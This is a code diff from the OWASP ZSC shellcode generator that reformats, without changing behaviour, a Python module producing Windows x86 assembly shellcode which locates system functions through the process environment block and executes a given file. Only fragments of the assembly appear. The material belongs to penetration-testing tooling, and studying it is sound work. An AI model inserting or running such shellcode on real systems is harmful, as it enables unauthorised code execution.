@@ -8,8 +8,10 @@ https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com 
 '''
 from core import stack
 from math import ceil
-def exc(file_to_exec,file_name):
-        return '''
+
+
+def exc(file_to_exec, file_name):
+    return '''
 xor    %ecx,%ecx
 mov    %fs:0x30(%ecx),%eax
 mov    0xc(%eax),%eax
@@ -81,8 +83,9 @@ call   *%edx
 xor    %ecx,%ecx
 push   %ecx
 call   *%eax
-'''.format(file_to_exec,hex(int(8 + 4*(ceil(len(file_name)/float(4))))))
+'''.format(file_to_exec, hex(int(8 + 4 * (ceil(len(file_name) / float(4))))))
+
 
 def run(data):
-   file_to_exec = data[0]
-   return exc(stack.generate(file_to_exec,"%ecx","string"),file_to_exec)
+    file_to_exec = data[0]
+    return exc(stack.generate(file_to_exec, "%ecx", "string"), file_to_exec)
